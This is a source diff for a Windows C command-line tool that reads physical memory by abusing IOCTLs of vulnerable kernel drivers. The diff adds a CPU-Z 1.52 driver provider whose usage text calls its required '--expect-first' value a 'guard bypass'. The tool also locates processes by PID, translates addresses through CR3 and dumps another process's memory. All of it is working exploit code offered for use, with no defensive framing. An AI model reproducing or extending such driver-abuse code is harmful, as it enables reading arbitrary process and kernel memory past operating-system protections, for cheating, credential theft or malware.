@@ -32,9 +32,10 @@ typedef struct mb_phys_reader mb_phys_reader;
 struct mb_phys_reader {
     const char *name;
     HANDLE dev;
-    int mode;                 // 0 cchwapi, 1 rtkio, 2 eneio64, 3 mock
+    int mode;                 // 0 cchwapi, 1 rtkio, 2 eneio64, 3 mock, 4 asrdrv, 5 mrt, 6 cpuz
     uint8_t *mock_mem;
     uint64_t mock_size;
+    uint32_t aux;             // provider-specific: e.g. CPU-Z expected page-first dword
     int (*read)(mb_phys_reader *r, uint64_t pa, void *buf, uint32_t size);
 };
 
@@ -99,6 +100,34 @@ static int read_eneio64(mb_phys_reader *r, uint64_t pa, void *buf, uint32_t size
 static int read_mock(mb_phys_reader *r, uint64_t pa, void *buf, uint32_t size) {
     if (!r->mock_mem || pa > r->mock_size || size > r->mock_size - pa) return 0;
     memcpy(buf, r->mock_mem + pa, size);
+    return 1;
+}
+
+// ---- 取数层 provider: CPU-Z 1.52 cpuz family physical dword read ----
+// IOCTL 0x9C402708: input {u32 address; u32 expected_first_dword_of_page};
+// output {u32 value}. Driver maps (address & ~0xFFF), requires the page's
+// first dword to equal expected (r->aux), then returns the dword at address.
+static int read_cpuz(mb_phys_reader *r, uint64_t pa, void *buf, uint32_t size) {
+    if (r->dev == INVALID_HANDLE_VALUE || !buf || !size) return 0;
+    uint8_t *out = (uint8_t *)buf;
+    uint32_t done = 0;
+    while (done < size) {
+        uint64_t cur = pa + done;
+        uint32_t page_off = (uint32_t)(cur & 0xFFF);
+        uint32_t in[2];
+        uint32_t outv[2] = { 0, 0 };
+        DWORD ret = 0;
+        in[0] = (uint32_t)cur;
+        in[1] = r->aux;
+        if (!DeviceIoControl(r->dev, 0x9C402708u, in, sizeof(in), outv, sizeof(outv), &ret, NULL))
+            return 0;
+        uint32_t chunk = 4 - (page_off & 3);
+        if (chunk > size - done) chunk = size - done;
+        if (chunk > 0x1000 - page_off) chunk = 0x1000 - page_off;
+        uint32_t val = outv[0] >> ((page_off & 3) * 8);
+        for (uint32_t i = 0; i < chunk; i++) out[done + i] = (uint8_t)(val >> (i * 8));
+        done += chunk;
+    }
     return 1;
 }
 
@@ -228,8 +257,18 @@ static int reader_open(mb_phys_reader *r, const char *kind, const char *device) 
         r->dev = CreateFileA(device ? device : "\\\\.\\fekern_00",
                              GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE,
                              NULL, OPEN_EXISTING, 0, NULL);
+    } else if (_stricmp(kind, "cpuz") == 0) {
+        r->name = "cpuz";
+        r->mode = 6;
+        r->read = read_cpuz;
+        const char *names[] = { device, "\\\\.\\Global\\CPUZ152", "\\\\.\\CPUZ152" };
+        for (int i = 0; i < (int)(sizeof(names) / sizeof(names[0])) && r->dev == INVALID_HANDLE_VALUE; i++) {
+            if (!names[i] || !names[i][0]) continue;
+            r->dev = CreateFileA(names[i], GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE,
+                                 NULL, OPEN_EXISTING, 0, NULL);
+        }
     } else {
-        fprintf(stderr, "[ERR] unknown reader '%s' (mock|cchwapi|rtkio|eneio64|asrdrv|mrt|mrt)\n", kind ? kind : "");
+        fprintf(stderr, "[ERR] unknown reader '%s' (mock|cchwapi|rtkio|eneio64|asrdrv|mrt|cpuz)\n", kind ? kind : "");
         return 0;
     }
     if (r->dev == INVALID_HANDLE_VALUE) {
@@ -525,17 +564,18 @@ static void usage(void) {
     printf("Usage:\n");
     printf("  layers --selftest-mock\n");
     printf("  layers --ranges                       (read physical RAM ranges from registry)\n");
-    printf("  layers --reader <cchwapi|rtkio|eneio64|asrdrv|mrt> [--device <path>] --read-phys --pa <hex> --size <n>\n");
-    printf("  layers --reader <cchwapi|rtkio|eneio64|asrdrv|mrt> [--device <path>] --cr3 <hex> --va <hex> --size <n>\n");
-    printf("  layers --reader <cchwapi|rtkio|eneio64|asrdrv|mrt> [--device <path>] --locate --pid <pid> --scan-start <hex> --scan-size <hex> [--name <exe>]\n");
-    printf("  layers --reader <cchwapi|rtkio|eneio64|asrdrv|mrt> [--device <path>] --locate --pid <pid> --auto-ranges [--name <exe>]\n");
+    printf("  layers --reader <cchwapi|rtkio|eneio64|asrdrv|mrt|cpuz> [--device <path>] --read-phys --pa <hex> --size <n>\n");
+    printf("  layers --reader <cchwapi|rtkio|eneio64|asrdrv|mrt|cpuz> [--device <path>] --cr3 <hex> --va <hex> --size <n>\n");
+    printf("  layers --reader <cchwapi|rtkio|eneio64|asrdrv|mrt|cpuz> [--device <path>] --locate --pid <pid> --scan-start <hex> --scan-size <hex> [--name <exe>]\n");
+    printf("  layers --reader <cchwapi|rtkio|eneio64|asrdrv|mrt|cpuz> [--device <path>] --locate --pid <pid> --auto-ranges [--name <exe>]\n");
     printf("  layers --reader ... --locate --pid <pid> (--scan-start/--scan-size | --auto-ranges) --va <hex> --size <n>\n");
+    printf("  note: --reader cpuz requires --expect-first <dword> (target page first dword, guard bypass)\n");
 }
 
 int main(int argc, char **argv) {
     const char *kind = NULL, *device = NULL, *name = NULL;
     uint64_t pa = 0, cr3 = 0, va = 0, scan_start = 0, scan_size = 0;
-    uint32_t size = 0x40, pid = 0;
+    uint32_t size = 0x40, pid = 0, expect_first = 0;
     int do_selftest = 0, do_read_phys = 0, do_explicit = 0, do_locate = 0, have_cr3 = 0, have_va = 0;
     int do_ranges = 0, auto_ranges = 0;
     for (int i = 1; i < argc; i++) {
@@ -543,6 +583,7 @@ int main(int argc, char **argv) {
         else if (strcmp(argv[i], "--reader") == 0 && i + 1 < argc) kind = argv[++i];
         else if (strcmp(argv[i], "--device") == 0 && i + 1 < argc) device = argv[++i];
         else if (strcmp(argv[i], "--name") == 0 && i + 1 < argc) name = argv[++i];
+        else if (strcmp(argv[i], "--expect-first") == 0 && i + 1 < argc) expect_first = (uint32_t)strtoul(argv[++i], NULL, 0);
         else if (strcmp(argv[i], "--pa") == 0 && i + 1 < argc) pa = _strtoui64(argv[++i], NULL, 0);
         else if (strcmp(argv[i], "--cr3") == 0 && i + 1 < argc) { cr3 = _strtoui64(argv[++i], NULL, 0); have_cr3 = 1; }
         else if (strcmp(argv[i], "--va") == 0 && i + 1 < argc) { va = _strtoui64(argv[++i], NULL, 0); have_va = 1; }
@@ -575,6 +616,7 @@ int main(int argc, char **argv) {
 
     mb_phys_reader r;
     if (!reader_open(&r, kind, device)) return 3;
+    r.aux = expect_first;
 
     int rc = 0;
     if (do_read_phys) {
